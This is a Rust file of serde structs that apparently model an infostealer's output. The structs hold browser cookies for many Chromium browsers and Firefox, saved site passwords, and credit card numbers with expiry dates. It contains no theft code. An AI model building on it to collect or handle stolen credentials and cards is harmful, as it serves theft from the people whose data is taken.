use std::collections::HashMap;

use serde::{Deserialize, Serialize};

#[derive(Debug,Clone, Serialize, Deserialize)]
pub struct BrowserCookies {
    pub Amigo: Vec<String>,
    pub Atom: Vec<String>,
    #[serde(rename = "Brave-Browser")]
    pub Brave_Browser: Vec<String>,
    pub Browser: Vec<String>,
    pub Chrome: Vec<String>,
    pub Chromium: Vec<String>,
    pub Chromodo: Vec<String>,
    pub Chromunium: Vec<String>,
    pub Comodo: Vec<String>,
    pub Dragon: Vec<String>,
    pub Edge: Vec<String>,
    pub EpicPrivacyBrowser: Vec<String>,
    #[serde(rename = "K-Melon")]
    pub K_Melon: Vec<String>,
    pub Kometa: Vec<String>,
    pub Maxthon3: Vec<String>,
    pub Nichrome: Vec<String>,
    pub OperaGX: Vec<String>,
    pub OperaStable: Vec<String>,
    pub Orbitum: Vec<String>,
    pub Slimjet: Vec<String>,
    pub Sputnik: Vec<String>,
    pub Torch: Vec<String>,
    pub Uran: Vec<String>,
    pub Vivaldi: Vec<String>,
    pub YandexBrowser: Vec<String>,
}

#[derive(Debug,Clone, Serialize, Deserialize)]
pub struct GeckoCookies {
    pub Firefox: Vec<String>,
}

#[derive(Debug,Clone, Serialize, Deserialize)]
pub struct Password {
    pub browser: String,
    pub password: String,
    pub profile: String,
    pub url: String,
    pub username: String,
}

#[derive(Debug,Clone, Serialize, Deserialize)]
pub struct Credits {
    pub browser: String,
    pub exp: String,
    pub name: String,
    pub number: String,
    pub profile: String,
}


#[derive(Debug,Clone, Serialize, Deserialize)]
pub struct Value {
    pub ccs: Vec<Credits>,
    pub chrome_cookies: BrowserCookies,
    pub gecko_cookies: GeckoCookies,
    pub key: String,
    pub passwords: Vec<Password>,
}

#[derive(Debug,Clone, Serialize, Deserialize)]
pub struct Root {
    pub key: String,
    pub value: Value,
}
